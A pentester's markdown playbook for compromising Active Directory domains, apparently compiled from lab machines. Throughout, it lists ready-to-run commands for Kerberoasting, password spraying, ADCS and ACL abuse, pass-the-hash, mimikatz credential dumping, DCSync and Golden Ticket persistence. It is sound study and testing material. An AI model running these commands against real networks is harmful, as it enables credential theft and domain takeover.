# Active Directory — Methodology

> My working playbook for going from a single low-privileged foothold to Domain
> Admin. Built from notes across AD-focused HTB / THM / Proving Grounds machines.

**The mindset that matters:** think in **chains, not boxes**. Starting from one
low-priv user, the goal is a path to the Domain Controller — so the flow is
always: enumerate → **BloodHound** → find a Kerberos/ACL/ADCS path → move
laterally → collect credentials on each host → reach the DC.

Hashcat modes I reach for constantly: NTLM `1000` · Kerberoast (TGS) `13100` ·
AS-REP `18200` · NetNTLMv2 `5600`.

Related: [Initial Enumeration](./enumeration.md) · [Windows PrivEsc](./windows-privesc.md) · [Linux PrivEsc](./linux-privesc.md)

---

## Phase 0 — Enumerate the domain (with whatever creds you have)

```bash
nxc smb <DC_IP>                                   # hostname, domain, signing
nxc smb <DC_IP> -u user -p 'pass' --users --groups --shares --pass-pol
nxc ldap <DC_IP> -u user -p 'pass' --bloodhound -c all --dns-server <DC_IP>
enum4linux-ng -A -u user -p pass <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -D 'user@domain' -w pass -b 'DC=domain,DC=local'
```

> **Run `--pass-pol` first.** Know the lockout threshold *before* you spray anything.
> A single account lockout can burn hours (or, in an exam, the box).

**BloodHound collection** — this is the map the whole engagement runs on:
```bash
bloodhound-python -u user -p 'pass' -d domain.local -ns <DC_IP> -c all
# or on Windows: SharpHound.exe -c All
```
Import the data, **Mark as Owned** everything I control, then run *Shortest Path
to Domain Admins* and *Shortest Path from Owned Principals*.

---

## Phase 1 — No credentials yet (network access only)

```bash
nxc smb <TARGET_IP> -u '' -p ''                          # null session
nxc smb <TARGET_IP> -u guest -p '' --rid-brute           # RID cycling → user list
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip <DC_IP>   # AS-REP roasting
# responder -I <iface>  → capture/relay NetNTLMv2 (only if in scope)
```

## Phase 2 — Have a user → Kerberos

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip <DC_IP> -request     # Kerberoast (hashcat -m 13100)
impacket-GetNPUsers  domain/user:pass -dc-ip <DC_IP> -request     # AS-REP    (hashcat -m 18200)
nxc smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success   # spray — respect the lockout policy
```

---

## Phase 3 — Escalation paths (BloodHound tells you which apply)

**ACL abuse:**
- **GenericAll / GenericWrite** on a user → targeted Kerberoast or shadow credentials.
- **ForceChangePassword** → reset the victim's password.
- **WriteDACL / WriteOwner** → grant yourself rights, then use one of the above.
- **AddMember** → add yourself to a group.
- **Shadow credentials:** `certipy shadow auto -u user@domain -p pass -account victim`

**ADCS (vulnerable certificate templates):**
```bash
certipy find -vulnerable -u user@domain -p pass -dc-ip <DC_IP>
certipy req  -u user@domain -p pass -ca <CA> -template <VulnTemplate> -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>    # → NT hash / TGT
```

**Delegation:** unconstrained (dump TGTs) · constrained (`getST -impersonate`) ·
RBCD (write `msDS-AllowedToActOnBehalfOfOtherIdentity`).

**High-value groups:**
- **Backup Operators / SeBackup** → dump NTDS/SAM (Phase 6).
- **Server Operators** → change a service binpath on the DC → SYSTEM.
- **DnsAdmins** → `dnscmd` DLL injection → SYSTEM on the DC.
- **Account Operators** → manage non-protected accounts.

---

## Phase 4 — Lateral movement

```bash
evil-winrm -i <TARGET_IP> -u user -p pass
evil-winrm -i <TARGET_IP> -u user -H <NTLM>                    # pass-the-hash
impacket-psexec/wmiexec/smbexec domain/user@<TARGET_IP> -hashes :<NTLM>
# overpass-the-hash / pass-the-ticket
impacket-getTGT domain/user -hashes :<NTLM>
export KRB5CCNAME=user.ccache ; impacket-psexec -k -no-pass domain/user@<host>
# Windows: runas /netonly /user:domain\user cmd
```

## Phase 5 — Credential access on each host
```
mimikatz # privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam ; lsadump::dcsync /user:krbtgt
```
```bash
reg save hklm\sam sam & reg save hklm\system system   # → secretsdump LOCAL
```
Also worth collecting: LSASS dumps, DPAPI secrets, cached credentials, **GMSA**, and **LAPS** (`ms-Mcs-AdmPwd`).

## Phase 6 — Domain dominance
```bash
impacket-secretsdump -just-dc domain/user:pass@<DC_IP>          # DCSync
impacket-secretsdump -ntds ntds.dit -system system LOCAL        # Backup Operators route
# Golden Ticket from the krbtgt hash — persistence
```

---

## Tools
NetExec (`nxc`) · BloodHound · Impacket (GetUserSPNs / GetNPUsers / secretsdump /
psexec / getST / getTGT) · `certipy` · `evil-winrm` · `mimikatz` · `Rubeus` · `hashcat`

---

## My six golden rules

1. **BloodHound first** — never guess a path; mark Owned as you go.
2. `--pass-pol` before any spray.
3. One user → target the DC. Chains, not boxes.
4. Kerberoast + AS-REP roasting are the first move after getting any user.
5. On every host: dump credentials and reuse them (PtH/PtT/spray) to reach the next.
6. Log every hash, password, and ticket — messy notes cost time and access.

---

## References

- [The Hacker Recipes — Active Directory](https://www.thehacker.recipes/ad/)
- [HackTricks — Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [BloodHound docs](https://bloodhound.readthedocs.io)
